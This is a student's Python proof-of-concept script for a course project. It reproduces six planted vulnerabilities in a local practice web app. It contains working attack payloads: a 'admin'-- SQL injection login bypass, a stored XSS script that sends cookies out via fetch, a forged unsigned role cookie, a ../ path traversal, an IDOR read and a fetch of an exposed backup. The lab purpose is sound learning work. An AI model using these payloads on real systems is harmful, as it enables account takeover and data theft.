# INF601 - Advanced Programming in Python
# Samuel Hart
# Mini Project 4
#
# pocs/replay.py: reproduces all six planted flags over HTTP against a local
# instance of the practice target.
#
# Every flag is obtained by exploiting the bug across the network. This script
# never reads a flag from disk. The only file it opens is submission.txt, and
# only at the very end, to compare what it just captured against what was
# submitted earlier. If the two disagree it prints the difference and exits
# non-zero, which is what makes this a check on the earlier work rather than a
# restatement of it.
#
# Run the target in one terminal and this script in another:
#   FLAG_SEED=s_hart .venv/bin/python app.py
#   .venv/bin/python pocs/replay.py
#
# The XSS finding is the one that wants a freshly started app. The simulated
# admin bot acts on each comment once per process lifetime (app.py:359,
# app.py:373), and /grab accumulates captures in memory for the life of the
# process (app.py:294). The payload therefore carries a marker unique to this
# run, and only the capture bearing that marker is accepted, so a capture left
# behind by an earlier run cannot be mistaken for this run's result. A fresh
# restart is still the clean precondition, and the script says so when it finds
# leftovers.

import base64
import html
import os
import re
import secrets
import sys
import time

import requests

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "5000"))
BASE_URL = "http://%s:%d" % (HOST, PORT)

# The script lives in pocs/, so the repository root is its parent directory.
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SUBMISSION_PATH = os.path.join(ROOT, "submission.txt")

TIMEOUT = 10
# The bot rescans the comments table every two seconds (app.py:397). This window
# allows for a slow first sweep plus the bot's own request to /grab.
BOT_TIMEOUT = 30


class ChallengeError(Exception):
    """Raised when a finding cannot be reproduced, carrying the reason."""


def extract_flag(text, challenge):
    """Return the FLAG{<challenge>_...} token in text, or raise ChallengeError."""
    # Anchoring on the challenge name stops one finding's flag from being
    # accepted as another finding's proof if a response ever contains both.
    match = re.search(r"FLAG\{%s_[0-9a-f]+\}" % re.escape(challenge), text)
    if not match:
        raise ChallengeError("no %s flag present in the response" % challenge)
    return match.group(0)


def grab_captures():
    """Return the capture entries that /grab is currently displaying."""
    page = html.unescape(requests.get(BASE_URL + "/grab", timeout=TIMEOUT).text)
    # Scoped to the list element so that <code> tags elsewhere in the layout
    # cannot be mistaken for captures.
    block = re.search(r"<ul>(.*?)</ul>", page, re.S)
    if not block:
        return []
    return re.findall(r"<code>(.*?)</code>", block.group(1), re.S)


def preflight():
    """Verify the target is reachable and seeded, raising ChallengeError otherwise."""
    try:
        page = requests.get(BASE_URL + "/", timeout=TIMEOUT)
    except requests.RequestException as exc:
        raise ChallengeError("target not reachable at %s (%s)" % (BASE_URL, exc))
    # base.html:20 to base.html:28 renders a warning banner when FLAG_SEED was
    # unset at startup. Flags captured against the default seed are not valid for
    # a real username, so stop here rather than report six flags that do not
    # count. app.py:48 to app.py:54 is where the fallback seed is applied.
    if "seed-warning" in page.text:
        raise ChallengeError(
            "target is running on the DEFAULT seed; restart it with "
            "FLAG_SEED set to the FHSU username")


def capture_sqli():
    """Bypass the login form by SQL injection and return the dashboard flag."""
    session = requests.Session()
    # The quote closes the username literal and -- comments out everything after
    # it, so the password condition disappears. app.py:213 to app.py:216 builds
    # the query by string interpolation, which is what makes the quote part of
    # the SQL rather than part of the data.
    login = session.post(BASE_URL + "/login",
                         data={"username": "admin'--", "password": "x"},
                         allow_redirects=False, timeout=TIMEOUT)
    if login.status_code != 302:
        raise ChallengeError("injection did not log in (HTTP %d, expected 302)"
                             % login.status_code)
    issued = session.cookies.get("auth")
    if not issued:
        raise ChallengeError("login succeeded but issued no auth cookie")
    # app.py:223 writes row["username"] and row["role"] into the cookie, so the
    # decoded value names the row the injected query returned. Requiring the
    # admin identity is what ties the flag that follows to the bypass.
    decoded = base64.b64decode(issued).decode()
    if decoded != "admin:admin":
        raise ChallengeError("cookie decoded to %r, expected admin:admin" % decoded)
    dashboard = session.get(BASE_URL + "/dashboard", timeout=TIMEOUT)
    return extract_flag(dashboard.text, "sqli")


def capture_idor():
    """Read admin's private message from a real alice session and return the flag."""
    session = requests.Session()
    login = session.post(BASE_URL + "/login",
                         data={"username": "alice", "password": "password123"},
                         allow_redirects=False, timeout=TIMEOUT)
    if login.status_code != 302:
        raise ChallengeError("alice login failed (HTTP %d, expected 302)"
                             % login.status_code)
    # This is a session the server issued, not a forged cookie. Asserting the
    # decoded value pins down that the identity is alice's own, because the
    # finding is that a legitimate user reaches another user's record.
    decoded = base64.b64decode(session.cookies.get("auth") or "").decode()
    if decoded != "alice:user":
        raise ChallengeError("expected an alice:user cookie, got %r" % decoded)
    # The list route filters by owner (app.py:253 to app.py:255), so admin's
    # message is absent from it. Its absence here is the contrast that makes the
    # detail request below meaningful.
    listing = session.get(BASE_URL + "/messages", timeout=TIMEOUT).text
    if "/messages/1" in listing:
        raise ChallengeError("message 1 already appears in alice's list")
    detail = session.get(BASE_URL + "/messages/1", timeout=TIMEOUT)
    if detail.status_code != 200:
        raise ChallengeError("message 1 returned HTTP %d, expected 200"
                             % detail.status_code)
    # The page renders row.owner, so this confirms the record served to alice is
    # admin's rather than assuming the id.
    if "To: admin" not in detail.text:
        raise ChallengeError("message 1 is not admin's, or the page changed shape")
    return extract_flag(detail.text, "idor")


def capture_xss():
    """Store a payload in the guestbook and return the flag the admin bot leaks."""
    # A per-run marker makes this run's capture identifiable among any others
    # /grab is holding, so an earlier run's flag cannot pass for this one.
    marker = "replay" + secrets.token_hex(8)
    # The bot requires both of these substrings in the lowercased body before it
    # will act on a comment (app.py:376), and it takes the URL from one of four
    # sink forms (app.py:379 to app.py:381); fetch( is the first alternative.
    # /grab reads its entire query string rather than a named parameter
    # (app.py:299), so the cookie the bot appends lands in the capture with no
    # separator required. app.py:390 appends it with no separator at all.
    payload = "<script>fetch('/grab?m=%s'+document.cookie)</script>" % marker
    # No session is used. app.py:277 falls back to the literal anonymous author
    # when nobody is logged in, so an unauthenticated visitor can plant this.
    posted = requests.post(BASE_URL + "/guestbook", data={"comment": payload},
                           allow_redirects=False, timeout=TIMEOUT)
    if posted.status_code != 302:
        raise ChallengeError("guestbook POST returned HTTP %d, expected 302"
                             % posted.status_code)

    deadline = time.time() + BOT_TIMEOUT
    while time.time() < deadline:
        for entry in grab_captures():
            if marker in entry:
                # The capture must carry the bot's cookie, not merely echo the
                # marker. app.py:360 is where the bot builds that cookie.
                if "session=admin" not in entry:
                    raise ChallengeError(
                        "capture lacks the bot cookie: %r" % entry)
                return extract_flag(entry, "xss")
        time.sleep(1)
    raise ChallengeError(
        "bot did not deliver the payload within %d seconds; it acts on each "
        "comment once per process lifetime, so restart the app and retry"
        % BOT_TIMEOUT)


def capture_authz():
    """Start from a real issued cookie, forge its role, and return the vault flag."""
    session = requests.Session()
    session.post(BASE_URL + "/login",
                 data={"username": "alice", "password": "password123"},
                 allow_redirects=False, timeout=TIMEOUT)
    issued = session.cookies.get("auth")
    if not issued:
        raise ChallengeError("alice login issued no auth cookie")
    username = base64.b64decode(issued).decode().split(":", 1)[0]
    if username != "alice":
        raise ChallengeError("issued cookie is not alice's: %r" % username)
    # The cookie carries no signature (app.py:182 to app.py:184) and /vault
    # compares its role field against a literal (app.py:314), so re-encoding the
    # same username with a different role is the entire exploit. The username is
    # taken from the server's own cookie so the tampering is confined to the role.
    forged = base64.b64encode(("%s:superadmin" % username).encode()).decode()
    # The genuine cookie must be refused, otherwise the forged request below
    # would not be evidence about the role check at all.
    refused = session.get(BASE_URL + "/vault", timeout=TIMEOUT)
    if refused.status_code != 403:
        raise ChallengeError("genuine alice cookie got HTTP %d at /vault, "
                             "expected 403" % refused.status_code)
    granted = requests.get(BASE_URL + "/vault", cookies={"auth": forged},
                           timeout=TIMEOUT)
    if granted.status_code != 200:
        raise ChallengeError("forged cookie got HTTP %d at /vault, expected 200"
                             % granted.status_code)
    return extract_flag(granted.text, "authz")


def capture_traversal():
    """Leave the download directory with a .. segment and return the flag."""
    # The URL is written out rather than passed as a params dict so the request
    # carries the same literal .. and slashes the recorded PoC used, instead of
    # whatever percent-encoding the client library would choose.
    escaped = requests.get(
        BASE_URL + "/download?file=../private/employee_notes.txt", timeout=TIMEOUT)
    if escaped.status_code != 200:
        raise ChallengeError("traversal request returned HTTP %d, expected 200"
                             % escaped.status_code)
    # The same filename without the .. segment must fail. app.py:162 to app.py:169
    # writes employee_notes.txt into private/, a sibling of the served public/,
    # so this control is what shows the .. is doing the work rather than the
    # endpoint serving that file anyway.
    plain = requests.get(BASE_URL + "/download?file=employee_notes.txt",
                         timeout=TIMEOUT)
    if plain.status_code != 404:
        raise ChallengeError("employee_notes.txt without .. returned HTTP %d, "
                             "expected 404" % plain.status_code)
    return extract_flag(escaped.text, "traversal")


def capture_exposure():
    """Follow the robots.txt breadcrumb to the served backup and return the flag."""
    robots = requests.get(BASE_URL + "/robots.txt", timeout=TIMEOUT).text
    if "/backups/" not in robots:
        raise ChallengeError("/robots.txt no longer names /backups/")
    # This path is the file's own location inside the directory the route serves,
    # and it deliberately contains no .. segment. The file is exposed because
    # that directory is served with no authentication check (app.py:338 to
    # app.py:347), not because anything escaped a boundary. Reaching it with a ..
    # through /download would reproduce the traversal finding instead of this one.
    backup = requests.get(BASE_URL + "/backups/vulnhub.sql.bak", timeout=TIMEOUT)
    if backup.status_code != 200:
        raise ChallengeError("/backups/vulnhub.sql.bak returned HTTP %d, "
                             "expected 200" % backup.status_code)
    # A missing sibling must 404, so the 200 above is a real hit rather than a
    # blanket response from the route. app.py:345 to app.py:346 is that branch.
    missing = requests.get(BASE_URL + "/backups/nope.bak", timeout=TIMEOUT)
    if missing.status_code != 404:
        raise ChallengeError("/backups/nope.bak returned HTTP %d, expected 404"
                             % missing.status_code)
    return extract_flag(backup.text, "exposure")


FINDINGS = [
    ("sqli", capture_sqli),
    ("idor", capture_idor),
    ("xss", capture_xss),
    ("authz", capture_authz),
    ("traversal", capture_traversal),
    ("exposure", capture_exposure),
]


def submitted_flags():
    """Return the set of flags recorded in submission.txt, one per line."""
    with open(SUBMISSION_PATH, encoding="utf-8") as handle:
        return {line.strip() for line in handle if line.strip()}


def compare_with_submission(captured):
    """Return True if the captured flags match submission.txt exactly, else report both."""
    submitted = submitted_flags()
    reproduced = set(captured.values())
    if reproduced == submitted:
        return True
    # Both directions are reported, so a flag that failed to reproduce and a flag
    # recorded in the file but not produced here are each visible.
    print("MISMATCH against %s" % SUBMISSION_PATH, file=sys.stderr)
    for flag in sorted(reproduced - submitted):
        print("  reproduced but NOT in submission.txt: %s" % flag, file=sys.stderr)
    for flag in sorted(submitted - reproduced):
        print("  in submission.txt but NOT reproduced: %s" % flag, file=sys.stderr)
    return False


def main():
    """Reproduce all six flags, compare them with submission.txt, and return an exit code."""
    try:
        preflight()
    except ChallengeError as exc:
        print("preflight failed: %s" % exc, file=sys.stderr)
        return 1

    # Leftover captures mean the app has not been restarted since an earlier run.
    # The marker handles that, but a fresh app is the clean precondition and the
    # operator should know which situation they are in.
    leftovers = grab_captures()
    if leftovers:
        print("note: /grab already holds %d capture(s) from an earlier run of "
              "this app. This run is identified by its own marker, but restart "
              "the app for a clean test." % len(leftovers), file=sys.stderr)

    print("reproducing 6 findings over HTTP against %s" % BASE_URL)
    captured = {}
    for name, capture in FINDINGS:
        try:
            flag = capture()
        except ChallengeError as exc:
            print("FAILED %s: %s" % (name, exc), file=sys.stderr)
            print("%d/6 flags reproduced" % len(captured), file=sys.stderr)
            return 1
        captured[name] = flag
        print("  %-9s %s" % (name, flag))

    if not compare_with_submission(captured):
        return 1
    # Printed last, and only once every flag has matched, so this line never
    # closes out a run that disagreed with submission.txt.
    print("6/6 flags reproduced")
    return 0


if __name__ == "__main__":
    sys.exit(main())
